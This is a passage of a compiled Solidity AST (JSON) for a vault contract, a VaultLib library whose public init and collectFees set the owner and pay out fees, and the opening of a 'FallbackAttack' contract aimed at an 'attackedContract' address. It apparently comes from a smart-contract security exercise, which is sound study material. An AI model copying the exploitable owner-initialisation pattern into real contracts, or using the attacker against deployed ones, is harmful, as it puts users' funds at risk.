															}
														},
														{
															"argumentTypes": null,
															"hexValue": "4661696c656420746f2073656e642066756e6473",
															"id": 151,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3623:22:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6ccad9b42603510aa2281dc09de0f29ec7380180d77b1d766639429fee61ba0f",
																"typeString": "literal_string \"Failed to send funds\""
															},
															"value": "Failed to send funds"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_6ccad9b42603510aa2281dc09de0f29ec7380180d77b1d766639429fee61ba0f",
																"typeString": "literal_string \"Failed to send funds\""
															}
														],
														"id": 149,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3609:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 152,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3609:37:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 153,
												"nodeType": "ExpressionStatement",
												"src": "3609:37:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "853828b6",
									"id": 155,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdrawAll",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 116,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3394:2:0"
									},
									"returnParameters": {
										"id": 117,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3404:0:0"
									},
									"scope": 163,
									"src": "3374:280:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 161,
										"nodeType": "Block",
										"src": "4381:13:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 158,
														"name": "deposit",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 68,
														"src": "4382:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$__$returns$__$",
															"typeString": "function ()"
														}
													},
													"id": 159,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4382:9:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 160,
												"nodeType": "ExpressionStatement",
												"src": "4382:9:0"
											}
										]
									},
									"documentation": null,
									"id": 162,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 156,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "4361:2:0"
									},
									"returnParameters": {
										"id": 157,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "4381:0:0"
									},
									"scope": 163,
									"src": "4354:40:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 385,
							"src": "713:3690:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": null,
							"fullyImplemented": true,
							"id": 240,
							"linearizedBaseContracts": [
								240
							],
							"name": "VaultLib",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 176,
										"nodeType": "Block",
										"src": "5095:100:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 171,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 168,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "5114:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 169,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "5114:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 170,
																"name": "storageOwner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 165,
																"src": "5128:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "5114:26:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "596f7520617265206e6f742074686520636f6e7472616374206f776e657221",
															"id": 172,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5141:33:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_14ef084e528ce0ed54a7e6e8396817d29b1700a1266da86ae3f4d025ce7b47a9",
																"typeString": "literal_string \"You are not the contract owner!\""
															},
															"value": "You are not the contract owner!"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_14ef084e528ce0ed54a7e6e8396817d29b1700a1266da86ae3f4d025ce7b47a9",
																"typeString": "literal_string \"You are not the contract owner!\""
															}
														],
														"id": 167,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "5106:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 173,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5106:69:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 174,
												"nodeType": "ExpressionStatement",
												"src": "5106:69:0"
											},
											{
												"id": 175,
												"nodeType": "PlaceholderStatement",
												"src": "5186:1:0"
											}
										]
									},
									"documentation": null,
									"id": 177,
									"name": "onlyOwner",
									"nodeType": "ModifierDefinition",
									"overrides": null,
									"parameters": {
										"id": 166,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 165,
												"name": "storageOwner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 177,
												"src": "5073:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 164,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5073:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5072:22:0"
									},
									"src": "5054:141:0",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 198,
										"nodeType": "Block",
										"src": "5469:201:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 190,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 185,
																"name": "storageOwner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 179,
																"src": "5488:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 188,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5512:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 187,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "5504:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 186,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "5504:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 189,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "5504:10:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "5488:26:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "456c206f776e6572207961206861207369646f206d6f646966696361646f2079206e6f2070756564652063616d6269617273652e",
															"id": 191,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5516:54:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_8b2c0cc110cb22f213ae6d036672ad90f933d31d663e6d083b02fb50136231c8",
																"typeString": "literal_string \"El owner ya ha sido modificado y no puede cambiarse.\""
															},
															"value": "El owner ya ha sido modificado y no puede cambiarse."
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_8b2c0cc110cb22f213ae6d036672ad90f933d31d663e6d083b02fb50136231c8",
																"typeString": "literal_string \"El owner ya ha sido modificado y no puede cambiarse.\""
															}
														],
														"id": 184,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "5480:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 192,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5480:91:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 193,
												"nodeType": "ExpressionStatement",
												"src": "5480:91:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 196,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 194,
														"name": "storageOwner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 179,
														"src": "5641:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 195,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 181,
														"src": "5656:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "5641:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 197,
												"nodeType": "ExpressionStatement",
												"src": "5641:21:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "f09a4016",
									"id": 199,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "init",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 182,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 179,
												"name": "storageOwner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 199,
												"src": "5425:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 178,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5425:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 181,
												"name": "_owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 199,
												"src": "5446:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 180,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5446:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5424:37:0"
									},
									"returnParameters": {
										"id": 183,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5469:0:0"
									},
									"scope": 240,
									"src": "5411:259:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 238,
										"nodeType": "Block",
										"src": "5987:232:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 212,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 210,
																"name": "storageFees",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 203,
																"src": "6007:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 211,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6021:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "6007:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "4e6f206665657320636f6c6c6563746564",
															"id": 213,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6024:19:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_041e4f13ebb3f12198f86efa41f366078c2d27e500cf26d08defcd64056bb723",
																"typeString": "literal_string \"No fees collected\""
															},
															"value": "No fees collected"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_041e4f13ebb3f12198f86efa41f366078c2d27e500cf26d08defcd64056bb723",
																"typeString": "literal_string \"No fees collected\""
															}
														],
														"id": 209,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "5998:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 214,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5998:46:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 215,
												"nodeType": "ExpressionStatement",
												"src": "5998:46:0"
											},
											{
												"assignments": [
													217
												],
												"declarations": [
													{
														"constant": false,
														"id": 217,
														"name": "fees",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 238,
														"src": "6055:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 216,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6055:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 219,
												"initialValue": {
													"argumentTypes": null,
													"id": 218,
													"name": "storageFees",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 203,
													"src": "6067:11:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6055:23:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 222,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 220,
														"name": "storageFees",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 203,
														"src": "6089:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 221,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6102:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "6089:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 223,
												"nodeType": "ExpressionStatement",
												"src": "6089:14:0"
											},
											{
												"assignments": [
													225,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 225,
														"name": "sent",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 238,
														"src": "6115:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 224,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "6115:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 232,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "",
															"id": 230,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6161:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 226,
																"name": "storageOwner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 201,
																"src": "6130:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 227,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "6130:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 229,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"argumentTypes": null,
																"id": 228,
																"name": "fees",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 217,
																"src": "6155:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "6130:30:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 231,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6130:34:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6114:50:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 234,
															"name": "sent",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 225,
															"src": "6183:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "4661696c656420746f2073656e642066656573",
															"id": 235,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6189:21:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_7a48677a86539eca4c4764df63c4dc52a283f5aa010e9eb1268173c5de7b0fd1",
																"typeString": "literal_string \"Failed to send fees\""
															},
															"value": "Failed to send fees"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_7a48677a86539eca4c4764df63c4dc52a283f5aa010e9eb1268173c5de7b0fd1",
																"typeString": "literal_string \"Failed to send fees\""
															}
														],
														"id": 233,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "6175:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 236,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6175:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 237,
												"nodeType": "ExpressionStatement",
												"src": "6175:36:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "a033fcd4",
									"id": 239,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": [
												{
													"argumentTypes": null,
													"id": 206,
													"name": "storageOwner",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 201,
													"src": "5973:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												}
											],
											"id": 207,
											"modifierName": {
												"argumentTypes": null,
												"id": 205,
												"name": "onlyOwner",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 177,
												"src": "5963:9:0",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$_t_address_$",
													"typeString": "modifier (address)"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "5963:23:0"
										}
									],
									"name": "collectFees",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 204,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 201,
												"name": "storageOwner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 239,
												"src": "5914:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 200,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5914:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 203,
												"name": "storageFees",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 239,
												"src": "5936:16:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 202,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5936:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5913:40:0"
									},
									"returnParameters": {
										"id": 208,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5987:0:0"
									},
									"scope": 240,
									"src": "5893:326:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 385,
							"src": "4489:2426:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 299,
							"linearizedBaseContracts": [
								299
							],
							"name": "FallbackAttack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 242,
									"name": "attackedContract",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 299,
									"src": "6959:24:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 241,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "6959:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 251,
										"nodeType": "Block",
										"src": "7092:82:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 249,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 247,
														"name": "attackedContract",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 242,
														"src": "7103:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 248,
														"name": "at_contract",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 244,
														"src": "7122:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "7103:30:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 250,
												"nodeType": "ExpressionStatement",
												"src": "7103:30:0"
											}
										]
									},
									"documentation": null,
									"id": 252,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 245,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 244,
												"name": "at_contract",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 252,
												"src": "7064:19:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 243,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "7064:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7063:21:0"
									},
									"returnParameters": {
										"id": 246,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "7092:0:0"
									},
									"scope": 299,
									"src": "7052:122:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 277,
										"nodeType": "Block",
										"src": "7210:310:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
